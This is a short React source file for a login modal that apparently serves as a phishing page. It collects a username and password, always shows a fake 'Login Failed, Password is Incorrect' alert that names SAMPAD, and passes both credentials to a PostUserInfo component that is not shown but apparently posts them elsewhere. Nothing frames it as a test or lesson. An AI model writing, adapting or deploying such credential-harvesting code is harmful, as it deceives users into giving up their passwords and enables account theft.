import { useRef, useState } from "react"
import { Link } from "react-router-dom"
import { MdKeyboardDoubleArrowRight } from "react-icons/md";
import PostUserInfo from "./PostUserInfo";


function Modal({open}){

    let usernameElem = useRef()
    let passElem = useRef()

    let [dataSent, setDataSent] = useState(false)

    function alertFuncAndPost(){
        setDataSent(!dataSent)
        console.log(usernameElem.current.value)
        
        alertFunc()
    }

    function alertFunc(){
        alert("Login Failed, Password is Incorrect \n Please try Again or Contact SAMPAD.")
    }

    if(open === true) {
        return(
            <>
                <div className="custom-input-text">
                    <input ref={usernameElem} placeholder="Username" />
                    <input type="password" ref={passElem} placeholder="Password" />
                </div>
                <div className="" onClick={alertFuncAndPost}>
                    <Link to="/" className="custom-btn">Login</Link>
                    <Link to="/" className="custom-btn2"><MdKeyboardDoubleArrowRight /></Link>
                </div>
                {dataSent === true ? <PostUserInfo usernameElem={usernameElem.current.value} passElem={passElem.current.value}/> : null}
            </>
        )
    }
}

export default Modal